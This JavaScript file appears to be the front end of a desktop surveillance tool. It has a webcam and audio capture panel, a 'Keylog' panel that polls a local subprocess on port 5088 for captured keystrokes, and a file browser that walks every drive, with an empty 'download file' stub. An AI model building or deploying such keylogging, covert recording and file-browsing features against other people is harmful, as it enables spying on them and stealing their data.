const axios = require("axios");//comunication with python sub process on port 5088
const fs = require('fs');
const path = require('path');

const video_element = document.getElementById("webcam_preview")
document.getElementById("stop_video").addEventListener('click', function () { camanager.stop_webcam() })
document.getElementById("start_video").addEventListener('click', function () { camanager.start_webcam() })
const keybox = document.getElementById('keybox');
const dirbox = document.getElementById('dirbox');
document.getElementById('back_a_dir').addEventListener('click', function () { directoryman.go_back_a_dir() })

window.onload = () => {
    setTimeout(() => {
        keylog.start_get_keys()
        //camanager.start_webcam()
        directoryman.search_root()
    }, 2000);//wait for server to start
}

/* Webcam */

let camanager = {
    //Start media stream from default media device
    start_webcam: async function () {
        if (navigator.mediaDevices.getUserMedia) {//Media devices
            //Get video stream from default webcam
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(function (stream) {
                console.log('Stream started: ', stream)
                video_element.srcObject = stream;//video stream
                return stream;

            }).catch(function (err0r) {
                console.warn('Stream failed', err0r);
                return err0r
            });
        }
    },
    stop_webcam() {//Get stream(s) and stop them
        var stream = video_element.srcObject;
        var tracks = stream.getTracks();

        for (var i = 0; i < tracks.length; i++) {
            var track = tracks[i];
            track.stop();
        }

        stream.srcObject = null;
    }
}


/* Keylog */

let keylog = {
    interval: null,
    start_get_keys: async function () {//start keylogging
        keylog.interval = setInterval(async () => { keylog.get_keys() }, 1000);
    },
    get_keys: async function () {
        let keys = axios.get('http://localhost:5088/key');

        await keys.then(keys => {
            keybox.innerText = "";
            //console.log(keys);
            keys.data.keys.forEach(keycode => {
                var keyholder = document.createElement('div');
                keyholder.className = "keyholder"
                keyholder.innerText = keycode;
                keybox.appendChild(keyholder)
            });
        })

    },
    stop_get_keys: async function () {
        clearInterval(keylog.interval);
    },
    clear: async function () {//clear keys
        axios.get('http://localhost:5088/key/clear')
    }
}


/* Directories */
let directoryman = {
    files: [],
    current_dir: [],
    search_root: async function () {//Search root drives, functionality stats here
        console.log('Search root');
        let letters = ['A:\\', 'B:\\', 'C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\', 'Z:\\'];
        document.getElementById('full_path').innerText = 'Drives';
        dirbox.innerHTML = "";
        directoryman.files = [];
        for (let i in letters) {
            if (fs.existsSync(letters[i])) {
                this.build_dir(letters[i], letters[i])
            }
        }
    },
    search_dir: async function (searchpath) {//searchpath must be a string
        this.current_dir.push(searchpath);//up the chain
        console.log('Search: ', searchpath);
        document.getElementById('full_path').innerText = searchpath;
        fs.readdir(searchpath, function (err, files) {
            if (err) {
                console.log(err)
                return 0;
            }
            dirbox.innerHTML = "";
            console.log(files)
            files.forEach(filee => { directoryman.build_dir(searchpath + '\\' + filee, filee) })

        })
    },
    build_dir: function (fpath, name) {//represent a directory
        var directory = document.createElement('div');
        directory.className = "directory"
        var filename = document.createElement('div');
        filename.className = "filename"
        filename.innerText = name;
        var dir_icon = document.createElement('div');
        if (path.parse(fpath).ext == "") {//directory
            dir_icon.className = "dir_icon"
            directory.addEventListener('click', function () { directoryman.search_dir(fpath) })//search this directory
            directory.title = "search directory"
        } else {//file
            dir_icon.className = "file_icon"
            directory.title = "download file"
            directory.addEventListener('click', function () {  })//download file
        }

        directory.appendChild(filename)
        directory.appendChild(dir_icon)
        dirbox.appendChild(directory)


    },
    go_back_a_dir: function () {
        console.log('Go back a dir')
        if (directoryman.current_dir.length < 2) {
            directoryman.current_dir = [];
            directoryman.search_root();
            return 0;
        } else {
            directoryman.current_dir.pop();
            var current = directoryman.current_dir.pop();
            console.log('back to: ',current)
            //document.getElementById('full_path').innerText = directoryman.current_dir[directoryman.current_dir.length]
            if (current == undefined) {
                directoryman.current_dir = [];
                directoryman.search_root();
            } else {
                directoryman.search_dir(current)
            }
        }
    }
}